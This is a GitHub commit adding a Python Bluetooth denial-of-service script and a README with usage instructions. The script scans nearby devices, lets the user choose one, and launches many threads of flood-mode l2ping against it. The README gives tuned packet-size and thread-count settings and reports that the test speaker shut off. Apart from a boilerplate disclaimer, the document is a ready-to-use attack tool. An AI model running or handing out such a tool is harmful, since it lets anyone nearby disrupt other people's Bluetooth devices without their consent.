e6ab5f1f6d2a6c5aa531470127e06f436fd55f27
ThisisANOM <143174378+ThisisANOM@users.noreply.github.com>
2024-01-27 18:31:25 +0330

    Add files via upload

---
+++ Bluetooth-DOS-Attack.py
@@ -0,0 +1,100 @@
+import os
+import threading
+import time
+import subprocess
+def DOS(target_addr, packages_size):
+    os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)
+
+def printLogo():
+    print('\x1b[37;4mhttps://github.com/ThisisANOM\x1b[0m')
+    print('\x1b[37;36m')
+    print('          Bluetooth DOS Script         ')
+    print('+------------------------------------+ ')
+    print('   ###    ##    ##  #######  ##     ## ')
+    print('  ## ##   ###   ## ##     ## ###   ### ')
+    print(" ##   ##  ####  ## ##     ## #### #### ")
+    print('##     ## ## ## ## ##     ## ## ### ## ')
+    print('######### ##  #### ##     ## ##     ## ')
+    print('##     ## ##   ### ##     ## ##     ## ')
+    print('##     ## ##    ##  #######  ##     ## ')
+    print('+------------------------------------+ ')
+    print('\x1b[0m')
+    print("Created By ANOM")
+    print("https://github.com/ThisisANOM")
+
+def main():
+    printLogo()
+    time.sleep(0.1)
+    print('')
+    print('\x1b[31mTHIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.')
+    if (input("Do you agree? (y/n) > ") in ['y', 'Y']):
+        time.sleep(0.1)
+        os.system('clear')
+        printLogo()
+        print('')
+        print("Scanning ...")
+        output = subprocess.check_output("hcitool scan", shell=True, stderr=subprocess.STDOUT, text=True)
+        lines = output.splitlines()
+        id = 0
+        del lines[0]
+        array = []
+        print("|id   |   mac_addres  |   device_name|")
+        for line in lines:
+            info = line.split()
+            mac = info[0]
+            array.append(mac)
+            print(f"|{id}   |   {mac}  |   {''.join(info[1:])}|")
+            id = id + 1
+        target_id = input('Target id or mac > ')
+        try:
+            target_addr = array[int(target_id)]
+        except:
+            target_addr = target_id
+
+
+        if len(target_addr) < 1:
+            print('[!] ERROR: Target addr is missing')
+            exit(0)
+
+        try:
+            packages_size = int(input('Packages size > '))
+        except:
+            print('[!] ERROR: Packages size must be an integer')
+            exit(0)
+        try:
+            threads_count = int(input('Threads count > '))
+        except:
+            print('[!] ERROR: Threads count must be an integer')
+            exit(0)
+        print('')
+        os.system('clear')
+
+        print("\x1b[31m[*] Starting DOS attack in 3 seconds...")
+
+        for i in range(0, 3):
+            print('[*] ' + str(3 - i))
+            time.sleep(1)
+        os.system('clear')
+        print('[*] Building threads...\n')
+
+        for i in range(0, threads_count):
+            print('[*] Built thread №' + str(i + 1))
+            threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()
+
+        print('[*] Built all threads...')
+        print('[*] Starting...')
+    else:
+        print('Bip bip')
+        exit(0)
+
+if __name__ == '__main__':
+    try:
+        os.system('clear')
+        main()
+    except KeyboardInterrupt:
+        time.sleep(0.1)
+        print('\n[*] Aborted')
+        exit(0)
+    except Exception as e:
+        time.sleep(0.1)
+        print('[!] ERROR: ' + str(e))
--- README.md
+++ README.md
@@ -1,2 +1,55 @@
-# Bluetooth-Jammer
+# Bluetooth DOS-Attack Script
+
+![Python Version](https://img.shields.io/pypi/pyversions/Django.svg)
+
 Script for conducting DOS-attacks on Bluetooth devices for pentest purposes.
+
+## Disclaimer
+
+This project was created for educational purposes and personal use only.
+
+**DISCLAIMER:** This software is provided "as is" without any warranty. Usage is at your own risk. The developers assume no liability for any misuse or damage caused by this program.
+
+## Installation
+
+```shell
+$ sudo apt update
+$ sudo apt install python3
+$ sudo git clone https://github.com/ThisisANOM/Bluetooth-Jammer.git
+$ cd Bluetooth-Jammer/
+$ python3 Bluetooth-DOS-Attack.py
+```
+
+## Note
+
+This script is designed to work only on Linux systems.You must have "l2ping" and "hcitool" utilities on your Linux machine (they are installed by default on Kali Linux).
+
+## Tested on
+
+Kali Linux as attacker, and Xiaomi Portable Bluetooth Speaker as target, 
+
+Raspberry Pi W Zero as attacker, and Redmi Buds Lite as target
+
+## Manual
+
+Target ID or MAC: ID or MAC address displayed after scanning.
+
+Package Size: Size of the packages to be sent to the target (600 is optimal).
+
+Threads Count: Number of threads that simultaneously send packages to the target. Optimal value can be found in the provided table.
+
+|  Packages size | Threads count| Ping, ms  | Distance, meters | Time waited, sec  | Device |
+|:--------------:|:-----: |:------------:|:--------------------:|:----------------:|:------:|
+|  600           | 1       | 9           |0,3                   |           5      |Xiaomi Mi Portable Bluetooth Speaker|
+|  600           | 10      | 38          |0,3                   |           5      |Xiaomi Mi Portable Bluetooth Speaker|
+|  600           | 20      | 78          |0,3                   |           5      |Xiaomi Mi Portable Bluetooth Speaker|
+|  600           | 50      | 229         |0,3                   |           5      |Xiaomi Mi Portable Bluetooth Speaker|
+|  600           | 100     | 413         |0,3                   |           5      |Xiaomi Mi Portable Bluetooth Speaker|
+|  600           | 200     | 806         |0,3                   |           5      |Xiaomi Mi Portable Bluetooth Speaker|
+|  600           | 500     | 1961        |0,3                   |           5      |Xiaomi Mi Portable Bluetooth Speaker|
+|  600           | 1000    | 6621        |0,3                   |           5      |Xiaomi Mi Portable Bluetooth Speaker|
+|  600           | 1000+   | Couldn't calculate  |0,3           |           5      |Xiaomi Mi Portable Bluetooth Speaker|
+
+## What Happens to the Target Device
+
+While I can't speak for all devices, the device I tested typically just turned off.
